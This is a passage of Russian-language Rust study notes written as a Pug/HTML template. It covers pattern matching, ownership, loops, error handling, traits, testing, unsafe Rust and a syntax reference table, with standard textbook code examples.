            Можно также смешивать и сопоставлять выражения <b>if let, else if</b> и <b>else if let</b>.<br>
            Это даёт больше гибкости, чем match выражение, в котором можно выразить только одно значение для сравнения с шаблонами.<br>
            Недостатком использования if let выражений является то, что компилятор не проверяет полноту (exhaustiveness) всех вариантов, в то время как с помощью выражения match это происходит.<br>
            <b>let PATTERN = EXPRESSION;</b><br>
            Шаблоны бывают двух форм: опровержимые и неопровержимые.<br>
            Шаблоны, которые будут соответствовать любому возможному переданному значению, являются неопровержимыми (irrefutable).<br>
            Примером может быть x в выражении let x = 5;, потому что x соответствует чему-либо и, следовательно, не может не совпадать.<br>
            Шаблоны, которые могут не соответствовать некоторому возможному значению, являются опровержимыми (refutable).<br>
            Примером может быть Some(x) в выражении if let Some(x) = a_value, потому что если значение в переменной a_value равно None, а не Some, то шаблон Some(x) не будет совпадать.<br>
            Сопоставление с литералом
          pre
            code.
              fn main() {
                let x = 1;
                match x {
                  1 => println!("one"),
                  2 => println!("two"),
                  3 => println!("three"),
                  _ => println!("anything"),
                }
              }
          p Сопоставление именованных переменных
          pre
            code.
              fn main() {
                let x = Some(5);
                let y = 10;
                match x {
                  Some(50) => println!("Got 50"),
                  Some(y) => println!("Matched, y = {y}"),
                  _ => println!("Default case, x = {:?}", x),
                }
                println!("at the end: x = {:?}, y = {y}", x);
              }
          p.
            Поскольку match начинает новую область видимости, то переменные, объявленные как часть шаблона внутри выражения match, будут затенять переменные с тем же именем вне конструкции match как и в случае со всеми переменными.<br>
            Группа шаблонов
          pre
            code.
              fn main() {
                let x = 1;
                match x {
                  1 | 2 => println!("one or two"),
                  3 => println!("three"),
                  _ => println!("anything"),
                }
              }
            Сопоставление диапозонов с помощью <b>..=</b>
          pre
            code.
              fn main() {
                let x = 5;
                match x {
                  1..=5 => println!("one through five"),
                  _ => println!("something else"),
                }
              }
          p Деструктуризация структуры
          pre
            code.
              struct Point {
                x: i32,
                y: i32,
              }
              fn main() {
                let p = Point { x: 0, y: 7 };
                let Point { x: a, y: b } = p;
                assert_eq!(0, a);
                assert_eq!(7, b);
              }
              <span>Или</span>
              struct Point {
                x: i32,
                y: i32,
              }
              fn main() {
                let p = Point { x: 0, y: 7 };
                let Point { x, y } = p;
                assert_eq!(0, x);
                assert_eq!(7, y);
              }
          p Деструктуризация и сопоставление с литералами в одном шаблоне
          pre
            code.
              struct Point {
                x: i32,
                y: i32,
              }
              fn main() {
                let p = Point { x: 0, y: 7 };
                match p {
                  Point { x, y: 0 } => println!("On the x axis at {x}"),
                  Point { x: 0, y } => println!("On the y axis at {y}"),
                  Point { x, y } => {
                    println!("On neither axis: ({x}, {y})");
                  }
                }
              }
          p Вместо создания переменных для всех полей мы также можем деструктурировать с помощью литеральных значений являющихся частью структуры.<br>
          pre
            code.
              struct Point {
                x: i32,
                y: i32,
              }
              fn main() {
                let p = Point { x: 0, y: 7 };
                match p {
                  Point { x, y: 0 } => println!("On the x axis at {x}"),
                  Point { x: 0, y } => println!("On the y axis at {y}"),
                  Point { x, y } => {
                    println!("On neither axis: ({x}, {y})");
                  }
                }
              }
          p Деструктуризация перечислений
          pre
            code.
              enum Message {
                Quit,
                Move { x: i32, y: i32 },
                Write(String),
                ChangeColor(i32, i32, i32),
              }
              fn main() {
                let msg = Message::ChangeColor(0, 160, 255);
                match msg {
                  Message::Quit => {
                    println!("The Quit variant has no data to destructure.");
                  }
                  Message::Move { x, y } => {
                    println!("Move in the x direction {x} and in the y direction {y}");
                  }
                  Message::Write(text) => {
                    println!("Text message: {text}");
                  }
                  Message::ChangeColor(r, g, b) => {
                    println!("Change the color to red {r}, green {g}, and blue {b}",)
                  }
                }
              }
          p.
            Этот код напечатает Change the color to red 0, green 160, and blue 255.<br>
            Деструктуризация вложенных структур и перечислений<br>
            До сих пор все наши примеры сопоставляли структуры или перечисления на один уровень глубины, но сопоставление может работать и с вложенными элементами!<br>
          pre
            code.
              enum Color {
                Rgb(i32, i32, i32),
                Hsv(i32, i32, i32),
              }
              enum Message {
                Quit,
                Move { x: i32, y: i32 },
                Write(String),
                ChangeColor(Color),
              }
              fn main() {
                let msg = Message::ChangeColor(Color::Hsv(0, 160, 255));
                match msg {
                  Message::ChangeColor(Color::Rgb(r, g, b)) => {
                    println!("Change color to red {r}, green {g}, and blue {b}");
                  }
                  Message::ChangeColor(Color::Hsv(h, s, v)) => {
                    println!("Change color to hue {h}, saturation {s}, value {v}")
                  }
                  _ => (),
                }
              }

      //- Memory
      details
        summary Memory
        p.
          Владение позволяет обеспечивать безопасность памяти без использования сборщика мусора.<br>
          <dfn>Владение</dfn> - это набор правил, определяющих как программа на Rust управляет памятью.<br>
          <dfn>Стек</dfn> - часть памяти, который хранит значения в порядке их получения, а удаляет - в обратном.<br>
          “Последний пришёл, первый вышел”.<br>
          Все данные, хранящиеся в стеке, должны иметь известный фиксированный размер.<br>
          Данные, размер которых во время компиляции неизвестен или может измениться, должны храниться в куче.<br>
          <dfn>Куча</dfn> - часть памяти, в которой распределитель памяти находит для данных подходящее место, помечает его как используемое и возвращает указатель - адрес этого места. Это выделение в куче или просто выделение.<br>
          <em>Правила владения</em>:<br>
          У каждого значения в Rust есть владелец.<br>
          У значения может быть только один владелец в один момент времени.<br>
          Когда владелец покидает область видимости, значение удаляется.<br>
          При вызове <b>String::from</b> происходит запрос необходимой памяти.<br>
          Память автоматически возвращается, как только владеющая памятью переменная выходит из области видимости { }.<br>
          Rust автоматически вызывает функцию drop после закрывающей фигурной скобки и очищает память.<br>
          Вектор освобождает память когда выходит из области видимости, при этом удаляются все значения, которые он содержит.<br>

      //- Cycle
      details
        summary Cycle
        p.
          <em>loop, while, for</em><br>
          <dfn>loop</dfn> - выполняет блок кода пока нет команды остановиться (break)<br>
          <dfn>break</dfn> - прерывает выполнение цикла и выходит из него<br>
          <dfn>continue</dfn> - пропустить оставшийся код в данной итерации цикла и перейти к следующей итерации<br>
          break counter*2 - останавливает выполнение цикла и возвращает значение выражения counter*2<br>
          break и continue применяется к самому внутреннему циклу внутри цепочки циклов.<br>
          Метка цикла <b>'</b> :
        pre
          code.
            'counting_up: loop {
              ...
              loop {
              ...
                if count == 2 {
                  <span>выход из цикла к 'counting_up в начале цикла</b>
                  break 'counting_up;
                }
              }
              ...
            }
        p.
          <b>while number! = 0 {...}</b> - пока условие истинно, код выполняется, в противном случае происходит выход из цикла.<br>
          Конструкция условного цикла while let позволяет повторять цикл while до тех пор, пока шаблон продолжает совпадать.<br>
          В цикле for значение, которое следует непосредственно за ключевым словом for , является шаблоном.<br>
          Например, в for x in y выражение x является шаблоном.<br>
          Цикл for:
        pre
          code.
            fn main () {
              let a = [10, 20, 30, 40, 50];
              for element in a {
                println! (“the value is: {element}”);
              }
            }
            fn main () {
              for number in (1..4).rev() {
                println! (“{number}!”);
              }
                println! (“LIFTOFF !!!”);
            }

      //- Error
      details
        summary Error
        p.
          В Rust ошибки группируются на две основные категории: исправимые (recoverable) и неисправимые (unrecoverable).<br>
          Rust имеет тип Result&lt;T, E&gt; для обрабатываемых (исправимых) ошибок и макрос panic!, который останавливает выполнение, когда программа встречает необрабатываемую (неисправимую) ошибку.<br>
          На практике существует два способа вызвать панику: путём выполнения действия, которое вызывает панику в нашем коде (например, обращение к массиву за пределами его размера) или путём явного вызова макроса panic!.<br>
          По умолчанию, когда происходит паника, программа начинает процесс раскрутки стека, означающий в Rust проход обратно по стеку вызовов и очистку данных для каждой обнаруженной функции.<br>
          Rust как альтернативу предоставляет вам возможность немедленного прерывания (aborting), которое завершает работу программы без очистки.<br>
          Память, которую использовала программа, должна быть очищена операционной системой.<br>
          Добавьте panic = 'abort' в раздел [profile] вашего Cargo.toml файла.<br>
          Мы можем использовать обратную трассировку вызовов функций которые вызвали panic! чтобы выяснить, какая часть нашего кода вызывает проблему.<br>
          Получить обратную трассировку можно с помощью установки переменной среды RUST_BACKTRACE в любое значение, кроме 0.<br>
          Обратная трассировка создаёт список всех функций, которые были вызваны до какой-то определённой точки выполнения программы.<br>
          Другие строки, которые выше над  строками с упоминанием наших файлов, - это код, который вызывается нашим кодом;<br>
          строки ниже являются кодом, который вызывает наш код.
        pre
          code.
            enum Result<T, E> {
              Ok(T),
              Err(E),
            }
        p.
          T представляет тип значения, которое будет возвращено в случае успеха внутри варианта Ok, а E представляет тип ошибки, которая будет возвращена при сбое внутри варианта Err.<br>
          Метод <dfn>unwrap/<dfn> - это метод быстрого доступа к значениям.<br> Если значение Result является вариантом Ok, unwrap возвращает значение внутри Ok.<br>
          Если Result - вариант Err, то unwrap вызовет для нас макрос panic!.<br>
          Метод expect позволяет указать сообщение об ошибке для макроса panic!.<br>
          expect используется так же как и unwrap: либо возвращается дескриптор файла либо вызывается макрос panic!.<br>
          Наше сообщение об ошибке в expect будет передано в panic! и заменит стандартное используемое сообщение.<br>
          Когда вы пишете функцию, реализация которой вызывает что-то, что может завершиться ошибкой, вместо обработки ошибки в этой функции, вы можете вернуть ошибку в вызывающий код, чтобы он мог решить, что с ней делать.<br>
          Такой приём известен как распространение ошибки (propagating the error).

      //- Trait
      details
        summary Trait
        p.
          Типаж сообщает компилятору Rust о функциональности, которой обладает определённый тип и которой он может поделиться с другими типами.<br>
          Можно использовать типажи, чтобы определять общее поведение абстрактным способом.<br>
          Мы можем использовать ограничение типажа (trait bounds) чтобы указать, что общим типом может быть любой тип, который имеет определённое поведение.<br>
          <dfn>Определение типажей</dfn> - это способ сгруппировать сигнатуры методов вместе для того, чтобы описать общее поведение.<br>
        pre
          code.
            pub trait Summary {
              fn summarize(&self) -> String;
            }
        p.
          После сигнатуры метода, вместо предоставления реализации в фигурных в скобках, мы используем точку с запятой.<br>
          Каждый тип, реализующий данный типаж, должен предоставить своё собственное поведение для данного метода.<br>
          Реализация типожа у типа
        pre
          code.
            impl Summary for NewsArticle {
              fn summarize(&self) -> String {}

            impl Summary for Tweet {
              fn summarize(&self) -> String {}
        p.
          Мы не можем реализовать внешние типажи для внешних типов.<br>
          Это ограничение является частью свойства называемого согласованность (coherence), а ещё точнее сиротское правило (orphan rule), которое называется так потому что не представлен родительский тип.<br>
          Без этого правила два крейта могли бы реализовать один типаж для одинакового типа и Rust не сможет понять, какой реализацией нужно пользоваться.<br>
          Типажи как параметры
        pre
          code.
            pub fn notify(item: &impl Summary) {
              println!("Breaking news! {}", item.summarize());
            }
        p.
          Вместо конкретного типа у параметра item указывается ключевое слово impl и имя типажа.<br>
          Этот параметр принимает любой тип, который реализует указанный типаж.<br>
          Обе записи одинаковы:
        pre
          code.
            pub fn notify(item1: &impl Summary, item2: &impl Summary) {
            pub fn notify&lt;T: Summary&gt;(item1: &T, item2: &T) {
        p Более одного типажа
        code pub fn notify(item: &(impl Summary + Display)) {
        p Это выражение:
        code fn some_function&lt;T: Display + Clone, U: Clone + Debug&gt;(t: &T, u: &U) -> i32 {
        p Можно записать так:
        pre
          code.
            fn some_function&lt;T, U&gt;(t: &T, u: &U) -> i32
            <span>where</span>
            T: Display + Clone,
            U: Clone + Debug,
            {
              fn returns_summarizable() -> impl Summary {
        p.
          Используя <b>impl Summary</b> для возвращаемого типа, мы указываем, что функция returns_summarizable возвращает некоторый тип, который реализует типаж Summary без обозначения конкретного типа.<br>
          Поскольку стандартная библиотека имеет эту общую реализацию, то можно вызвать метод to_string определённый типажом ToString для любого типа, который реализует типаж Display:
        pre
          code.
            impl&lt;T: Display&gt; ToString for T {
            // --snip--
            }
        p.
          Общие реализации приведены в документации к типажу в разделе "Implementors".<br>
          Типажи и ограничения типажей позволяют писать код, который использует параметры обобщённого типа для уменьшения дублирования кода, а также указывая компилятору, что мы хотим обобщённый тип, чтобы иметь определённое поведение.<br>
          Затем компилятор может использовать информацию про ограничения типажа, чтобы проверить, что все конкретные типы, используемые с нашим кодом, обеспечивают правильное поведение.<br>
          В Rust применяется подход с использованием типажей-объектов вместо наследования.<br>
          Мы можем использовать типаж-объекты вместо универсального или конкретного типа.<br>
          Везде, где мы используем типаж-объект, система типов Rust проверит во время компиляции, что любое значение, используемое в этом контексте, будет реализовывать нужный типаж у типаж-объекта.<br>
          Следовательно, нам не нужно знать все возможные типы во время компиляции.<br>
          В структуре или перечислении данные в полях структуры и поведение в блоках impl разделены, тогда как в других языках данные и поведение объединены в одну концепцию, часто обозначающуюся как объект.<br>
          Тем не менее, типаж-объекты являются более похожими на объекты на других языках, в том смысле, что они сочетают в себе данные и поведение.<br>
          Но типаж-объекты отличаются от традиционных объектов тем, что не позволяют добавлять данные к типаж-объекту.<br>
          Типаж-объекты обычно не настолько полезны, как объекты в других языках:<br>
          их конкретная цель - обеспечить абстракцию через общее поведение.<br>
          Когда мы используем типаж-объекты, Rust должен использовать динамическую диспетчеризацию.<br>
          Компилятор не знает всех типов, которые могут быть использованы с кодом, использующим типаж-объекты, поэтому он не знает, какой метод реализован для какого типа при вызове.<br>
          Вместо этого, во время выполнения, Rust использует указатели внутри типаж-объекта, чтобы узнать какой метод вызвать.<br>
          Такой поиск вызывает дополнительные затраты во время исполнения, которые не требуются при статической диспетчеризации.<br>
          Деструктуризация структур и кортежей
        pre
          code.
            fn main() {
              struct Point {
                x: i32,
                y: i32,
              }
              let ((feet, inches), Point { x, y }) = ((3, 10), Point { x: 3, y: -10 });
            }

      //- Test
      details
        summary Test
        p.
          <dfn>Тесты</dfn> - это функции Rust, которые проверяют, что не тестовый код работает ожидаемым образом.<br>
          Содержимое тестовых функций обычно выполняет следующие три действия:<br>
          1. Установка любых необходимых данных или состояния.<br>
          2. Запуск кода, который вы хотите проверить.<br>
          3. Утверждение, что результаты являются теми, которые вы ожидаете.<br>
          Чтобы превратить функцию в тестирующую функцию добавьте #[test] в строку перед fn.<br>
          Когда вы запускаете тесты командой cargo test, Rust создаёт бинарный модуль выполняющий функции аннотированные атрибутом test и сообщающий о том, успешно или нет прошла каждая тестирующая функция.<br>
          Макрос <b>assert!</b> доступен из стандартной библиотеки и является удобным, когда вы хотите проверить что некоторое условие в тесте вычисляется в значение true.<br>
          Когда проверка не срабатывает, макросы печатают значения аргументов с помощью отладочного форматирования и это означает, что значения сравниваемых аргументов должны реализовать типажи <b>PartialEq</b> и <b>Debug</b>.<br>
          Все примитивные и большая часть типов стандартной библиотеки Rust реализуют эти типажи.<br>
          Для структур и перечислений, которые вы реализуете сами будет необходимо реализовать типаж PartialEq для сравнения значений на равенство или неравенство.<br>
          Для печати отладочной информации в виде сообщений в строку вывода консоли необходимо реализовать типаж Debug.<br>
          Так как оба типажа являются выводимыми типажами, то эти типажи можно реализовать добавив аннотацию <b>#[derive(PartialEq, Debug)]</b> к определению структуры или перечисления.<br>
          Общим способом проверки функциональности является использование сравнения результата тестируемого кода и ожидаемого значения, чтобы убедиться в их равенстве.<br>
          Для этого можно использовать макрос assert!, передавая ему выражение с использованием оператора ==.<br>
          Cтандартная библиотека предлагает пару макросов assert_eq! и assert_ne!, чтобы сделать тестирование более удобным.<br>
          Эти макросы сравнивают два аргумента на равенство или неравенство соответственно.<br>
          Макросы также печатают два значения входных параметров, если тест завершился ошибкой, что позволяет легче увидеть почему тест ошибочен.<br>
          Противоположно этому, макрос assert! может только отобразить, что он вычислил значение false для выражения ==, но не значения, которые привели к результату false.<br>
          В своей работе макросы assert_eq! и assert_ne! неявным образом используют операторы == и != соответственно.<br>
          Другой атрибут тест-функции <b>#[should_panic]</b>.<br>
          Этот атрибут сообщает системе тестирования, что тест проходит, когда метод генерирует ошибку.<br>
        pre
          code.
            #[cfg(test)]
            mod tests {
              use super::*;
              #[test]
              #[should_panic]
              fn greater_than_100() {
        p.
          Тест с атрибутом should_panic пройдёт, даже если тест паникует по причине, отличной от той, которую мы ожидали.<br>
          Чтобы сделать тесты с should_panic более точными, мы можем добавить необязательный параметр expected для атрибута should_panic.
        pre
          code.
            #[cfg(test)]
            mod tests {
              use super::*;
              #[test]
              #[should_panic(expected = "less than or equal to 100")]
              fn greater_than_100() {
        p Написание тестов так, чтобы они возвращали Result&lt;T, E&gt; позволяет использовать оператор "вопросительный знак" в теле тестов, который может быть удобным способом писать тесты, которые должны выполниться не успешно, если какая-либо операция внутри них возвращает вариант ошибки Err.
        pre
          code.
              #[cfg(test)]
              mod tests {
                #[test]
                fn it_works() -> Result<(), String> {
                  if 2 + 2 == 4 {
                    Ok(())
                  } else {
                    Err(String::from("two plus two does not equal four"))
                  }
                }
              }
        p.
          Поскольку тесты выполняются параллельно, вы должны убедиться, что ваши тесты не зависят друг от друга или от какого-либо общего состояния, включая общее окружение, например, текущий рабочий каталог или переменные окружения.<br>
          <b>cargo test -- --test-threads=1</b><br>
          Мы устанавливаем количество тестовых потоков равным 1, указывая программе не использовать параллелизм.<br>
          Выполнение тестов с использованием одного потока займёт больше времени, чем их параллельное выполнение, но тесты не будут мешать друг другу, если они совместно используют состояние.<br>
          Если мы хотим видеть напечатанные результаты прохождения тестов, мы можем сказать Rust, чтобы он также показывал результаты успешных тестов с помощью <b>--show-output</b>.<br>
          <b>cargo test -- --show-output</b><br>
          Запустить только несколько тестов, используя команду cargo test, передав в качестве аргумента имена тестов.<br>
          <b>cargo test it_works</b><br>
          Мы можем указать часть имени теста, и будет запущен любой тест, имя которого соответствует этому значению.<br>
          Можно аннотировать тесты атрибутом ignore, чтобы исключить их из исполнения:
        pre
          code.
            #[test]
            fn it_works() {
              assert_eq!(2 + 2, 4);
            }
            #[test]
            #[ignore]
            fn expensive_test() {
              // code that takes an hour to run
            }
        p.
          Если вы хотите выполнить только проигнорированные тесты, вы можете воспользоваться командой <b>cargo test -- --ignored</b><br>
          Если вы хотите запустить все тесты независимо от того, игнорируются они или нет, выполните cargo <b>test -- --include-ignored</b>.<br>
          Модульные тесты это небольшие и более сфокусированные на тестировании одного модуля в отдельности или могут тестироваться приватные интерфейсы.<br>
          Интеграционные тесты являются полностью внешними по отношению к вашей библиотеке и используют код библиотеки так же, как любой другой внешний код, используя только общедоступные интерфейсы и потенциально выполняя тестирование нескольких модулей в одном тесте.<br>
          Целью модульных тестов является тестирование каждого блока кода, изолированное от остального функционала, чтобы можно было быстро понять, что работает некорректно или не так как ожидается.<br>
          Аннотация <b>#[cfg(test)]</b> у модуля с тестами указывает Rust компилировать и запускать только код тестов, когда выполняется команда cargo test, а не когда запускается cargo build.<br>
          Тем не менее, так как модульные тесты идут в тех же файлах что и основной код, вы будете использовать <b>#[cfg(test)]</b> чтобы указать, что они не должны быть включены в скомпилированный результат.<br>
          Мы создаём папку tests в корневой папке вашего проекта, рядом с папкой src.<br>
          Cargo знает, что искать файлы с интеграционными тестами нужно в этой директории.<br>
          Нам не нужно комментировать код в tests/integration_test.rs с помощью <b>#[cfg(test)]</b>.<br>
          Cargo специальным образом обрабатывает каталог tests и компилирует файлы в этом каталоге только тогда, когда мы запускаем команду cargo test.<br>
          Выходные данные представлены тремя разделами:<br>
          модульные тесты, интеграционные тесты и тесты документации.<br>
          Чтобы запустить все тесты в конкретном файле интеграционных тестов, используйте аргумент --test сопровождаемый именем файла у команды cargo test:<br>
          <b>cargo test --test integration_test</b><br>
          Файлы в подкаталогах каталога tests не компилируются как отдельные крейты или не появляются в результатах выполнения тестов.<br>
          Если наш проект является бинарным крейтом, который содержит только src/main.rs и не содержит src/lib.rs, мы не сможем создать интеграционные тесты в папке tests и подключить функции определённые в файле src/main.rs в область видимости с помощью оператора use.<br>
          Только библиотечные крейты могут предоставлять функции, которые можно использовать в других крейтах;<br>
          бинарные крейты предназначены только для самостоятельного запуска.<br>
          Процесс разработки через тестирование (TDD), который следует этим шагам:<br>
          Напишите тест, который не прошёл и запустите его, чтобы убедиться, что он не прошёл по той причине, которую вы ожидаете.<br>
          Пишите или изменяйте ровно столько кода, чтобы успешно выполнился новый тест.<br>
          Выполните рефакторинг кода, который вы только что добавили или изменили, и убедитесь, что тесты продолжают проходить.<br>
          Повторите с шага 1!<br>

      //- Unsafe Rust
      details
        summary Unsafe Rust
        p.
          Чтобы переключиться на небезопасный Rust, используйте ключевое слово <dfn>unsafe</dfn>, а затем начните новый блок, содержащий небезопасный код.<br>
          В небезопасном Rust можно выполнять пять действий, которые недоступны в безопасном Rust, которые мы называем небезопасными супер силами.<br>
          Эти супер силы включают в себя следующее:<br>
          - Разыменование сырого указателя<br>
          - Вызов небезопасной функции или небезопасного метода<br>
          - Доступ или изменение изменяемой статической переменной<br>
          - Реализация небезопасного типажа<br>
          - Доступ к полям в union<br>
          Люди подвержены ошибкам и ошибки будут происходить, но требуя размещение этих четырёх небезопасных операции внутри блоков, помеченных как unsafe, вы будете знать, что любые ошибки, связанные с безопасностью памяти, будут находиться внутри unsafe блоков.<br>
          Делайте unsafe блоки маленькими; вы будете благодарны себе за это позже, при исследовании ошибок с памятью.<br>
          Части стандартной библиотеки реализованы как проверенные, безопасные абстракции над небезопасным кодом.<br>
          Создание необработанных указателей из ссылок
        pre
          code.
            fn main() {
              let mut num = 5;
              let r1 = &num as *const i32;
              let r2 = &mut num as *mut i32;
            }
        p.
          В отличие от ссылок и умных указателей, сырые указатели:<br>
          - могут игнорировать правила заимствования и иметь неизменяемые и изменяемые указатели, или множество изменяемых указателей на одну и ту же область памяти<br>
          - не гарантируют что ссылаются на действительную память<br>
          - могут быть null<br>
          - не реализуют автоматическую очистку памяти<br>
          Разыменование сырых указателей в блоке unsafe
        pre
          code.
            fn main() {
              let mut num = 5;
              let r1 = &num as *const i32;
              let r2 = &mut num as *mut i32;
              unsafe {
                println!("r1 is: {}", *r1);
                println!("r2 is: {}", *r2);
              }
            }
        p Вызов небезопасной функции или метода
        pre
          code.
            fn main() {
              unsafe fn dangerous() {}
              unsafe {
                dangerous();
              }
            }
        p.
          обёртывание небезопасного кода в безопасную функцию - это обычная абстракция.<br>
          Использование небезопасного кода в реализации функции split_at_mut
        pre
          code.
            use std::slice;
            fn split_at_mut(values: &mut [i32], mid: usize) -> (&mut [i32], &mut [i32]) {
              let len = values.len();
              let ptr = values.as_mut_ptr();
              assert!(mid <= len);
              unsafe {
                (
                  slice::from_raw_parts_mut(ptr, mid),
                  slice::from_raw_parts_mut(ptr.add(mid), len - mid),
                )
              }
            }
            fn main() {
              let mut vector = vec![1, 2, 3, 4, 5, 6];
              let (left, right) = split_at_mut(&mut vector, 3);
            }
        p.
          мы можем быть уверены, что все сырые указатели, используемые в unsafe блоке будут действительными указателями на данные внутри среза.<br>
          Это приемлемое и правильное использование unsafe.<br>
          Иногда вашему коду на языке Rust может потребоваться взаимодействие с кодом, написанным на другом языке.<br>
          Для этого в Rust есть ключевое слово extern, которое облегчает создание и использование интерфейса внешних функций (<dfn>Foreign Function Interface - FFI</dfn>).<br>
          <dfn>FFI</dfn> - это способ для языка программирования определить функции и позволить другому (внешнему) языку программирования вызывать эти функции.
        pre
          code.
            extern "C" {
              fn abs(input: i32) -> i32;
            }
            fn main() {
              unsafe {
                println!("Absolute value of -3 according to C: {}", abs(-3));
              }
            }
        p мы делаем функцию call_from_c доступной из кода на языке C, после того как она скомпилирована в разделяемую библиотеку и прилинкована из C
        pre
          code.
            #![allow(unused)]
            fn main() {
              #[no_mangle]
              pub extern "C" fn call_from_c() {
                println!("Just called a Rust function from C!");
              }
            }
        p Определение и использование неизменяемой статической (глобальной) переменной
        pre
          code.
            static HELLO_WORLD: &str = "Hello, world!";
            fn main() {
              println!("name is: {}", HELLO_WORLD);
            }
        p.
          Имена статических переменных по общему соглашению пишутся в нотации SCREAMING_SNAKE_CASE, и мы должны указывать тип переменной, которым в данном случае является &'static str.<br>
          Чтение из изменяемой статической переменной или запись в неё небезопасны
        pre
          code.
            static mut COUNTER: u32 = 0;
            fn add_to_count(inc: u32) {
              unsafe {
                COUNTER += inc;
              }
            }
            fn main() {
              add_to_count(3);
              unsafe {
                println!("COUNTER: {}", COUNTER);
              }
            }
        p.
          Мы можем использовать unsafe для реализации небезопасного трейта.<br>
          Трейт является небезопасным, если хотя бы один из его методов имеет некоторый инвариант, который компилятор не может проверить.
        pre
          code.
            unsafe trait Foo {
            // methods go here
            }
            unsafe impl Foo for i32 {
            // method implementations go here
            }
            fn main() {}

      //- Syntax
      details
        summary Syntax
        table
          caption Syntax
          thead
            tr
              th Syntax
              th Meta
          tbody
            tr
              td let
              td ключевое слово для объявления переменной
            tr
              td {}
              td Scope - блок кода, в котором живёт объявленная переменная
            tr
              td Shadowing
              td затенение - позволяет переобъявить переменную в том же блоке кода под тем же именем
            tr
              td let x: i32;
              td объявление переменной х типа интежер 32-бита тип указывать желательно
            tr
              td ;
              td.
                если есть ; то не возвращаем <br>
                Statment: let x = 3; - ничего не вернём, т.к. есть ; - это Statment.<br>
                Если есть = то это всегда statment.
                Expression: x += 1 - вернем значение 4, т.к. нет ; - это Expression
            tr
              td let x: i32 = 5;
              td.
                инициализация переменной - присваиваем переменной значение <br>
                значения, размер которых известен храняться в стэке, если размер не известен то в куче.                
            tr
              td assert_eq!(x, 5);
              td assert - утверджать, equal - равенство. Макрос (!), который проверяет на равенство.
            tr
              td println!("Success"):
              td Макрос (!), который выводит в стандартный вывод (терминал) то, что в "" и переводит курсор на новую строку
            tr
              td format!("{}", x)
              td возвращает String
            tr
              td let _y: i32;
              td _y означает неиспользуемая переменная
            tr
              td #[allow(unused_variables)]
              td.
                говорит компелатору позволить неиспользуемые переменные <br>
                при такой записи имена переменных можно без _                
            tr
              td #[derive(Debug)]
              td говорит компилятору использовать анотацию "{:?}". dbg!(x) - выводит значение переменной х в режиме дебага                
            tr
              td #[derive(Display)]
              td говорит компилятору использовать анотацию "{}"                
            tr
              td let (x, y);
              td объявление сразу нескольких переменных let x; и let y;                
            tr
              td let mut x;
              td mut означает что значение переменной можно изменять                
            tr
              td x += 2;
              td короткая запись х = х + 2;                
            tr
              td let &x = y;
              td &x ссылка по имени х ссылается на у                
            tr
              td let &mut x = mut y;
              td изменяемая ссылка х ссылается на изменяемую переменную у                
            tr
              td let &<'a> x
              td <'a> время жизни ссылки &                
            tr
              td *x
              td Если х содержит ссылку &x, то * даёт нам значение по ссылке &x                
            tr
              td let t = (2, "hello", 6.4);
              td tuple - коллекция разнотипных значенией, доступ t.0, println!((только до 12 значений));                
            tr
              td let (x, y) = (1, 2);
              td Деструктуризация tuple (1, 2) - х = 1, у = 2                
            tr
              td.
                let (x, y); <br>
                (x, ..) = (3, 4);<br>
                [.., y] = [1, 2];                    
              td.
                Деструктуризация: х принимает значение 3, .. означает пропустить, у принимает значение 2. <br>
                [x, y] = [3, 2]                
            tr
              td.
                Integers: i32 <br>
                Floats: f64
              td.
                По умолчанию целое число i32, а число с плавающей точкой - f64 <br>
                при операциях с f64 большая точность выявляет погрешность чисел, поэтому равенства могут на работать <br>
                в таких случаях нужно использовать f32: 0.1 + 0.2 == 0.300000000000000001.
            tr
              td let x: u16 = 38_u8 as u16;
              td.
                объявил переменную х типа u16 и присваиваю ей значение 38 типа u8 <br>
                но т.к. присваивать можно значения только того же типа, то меняем тип as u16
            tr
              td ()
              td.
                unit тип, который не имеет значения, размер 0 байт. let _v: () = ();<br>
                представляет собой пустой tuple, возвращается когда функция ничего не возвращает.
            tr
              td bool
              td логический тип false и true, иметт размер 1 байт
            tr
              td char
              td тип символа имеет размер 4 байта. обозначается одинарной кавычкой ''.
            tr
              td String
              td.
                тип строки - набор символов в виде вектора байт. обозначается двойной кавычкой "". let x = String::from("hello");<br>
                переменная x хранит ярлык с длиной, ёмкостью и указателем на адрес памяти в куче где хранится "hello"<br>
                Методы приведения к типу String: String::from("hallo"); "hello".to_string(); s.replace("word1", "word2"); - заменяет word1 на word2 в строке s<br>
                s.push_str("hello, world"); - когда добавляем в строку другую строку, s.push('!'); - когда добавляем в строку один символ
                s3: String = s1: String + s2.as_str(); - при конкатенации строк второе слагаемое должно быть &str. Метод s.clear() - делает строку пустой.
            tr
              td str
              td.
                тип строкового литерала "hello", используется только по ссылке &str <br>
                хранится в стэке и является представлением (фотографией на данный момет) строки типа String,<br>
                которая храниться в куче. <br>
                Т.е. при инициализации переменной типа &str мы идём в кучу делаем срез нужной строки <br>
                и сохраняем его в стэке под именем инициализируемой переменной
            tr
              td \
              td экранирование символов в стоке
            tr
              td let row_str = r"\x3F";
              td в row строке экранирование не работает, конвертации в символ не будет
            tr
              td let s = &s1[0..1];
              td доступ к символам в строке s только через срез. В срезе указываетс диапозон байт строки в котором находится нужный символ
            tr
              td <b>=</b>
              td.
                Присваивание. Значение, которое имеет фиксированный размер живёт в стеке и принадлежит переменной.<br>
                значение, которое может изменяться живёт в куче, на его адрес в куче указывает переменная,<br>
                в которй хранится указатель, длина значения и количество памяти зарезервированное под это значение.<br>
                При присваивании значения переменной из стэка другой переменной происходит копирование значения.<br>
                При присваивании значения переменной из кучи другой переменной происходит перемещение указателя,<br>
                длины и количества памяти из старой переменной в новую. Старая переменная уничтожается.<br>
                let new_var = old_var.clone(); - копия значения в куче и указатель на копию в новой переменной
            tr
              td ::
              td.
                обращение к ассоциированной функции String::from("hello");<br>
                ассоциированная - это функция без аргумента self
            tr
              td .
              td.
                обращение к методу "hello".to_string();<br>
                метод - это функция первый аргумент которой self
            tr
              td 0xff
              td 16-ти ричное значение 255
            tr
              td 0o77
              td 8-ти ричное значение 63
            tr
              td 0b1111_1111
              td бинарное (0 и 1) значение 255 
            tr
              td.
                for i in 'a'..='z' {<br>
                  println!("{}", i);}
              td.
                for _ in _ {} - цикл. 'a'..='z' - диапозон от..до. если есть =, значит включительно. <br>
                "{}", i - вставить в стоку значение i
            tr
              td.
                for c in "hello".chars() {<br>
                  println!("{}", c) }
              td.
                Метод chars() переведёт символы строки в итератор (в последовательность для итерирования). <br>
                Цикл for пройдёт по всей последовательности и выведет каждый символ на печать
            tr
              td Function
              td именованный блок кода, который используется несколько раз
            tr
              td.
                fn name(x: i32, y: i32) -> i32 {<br>
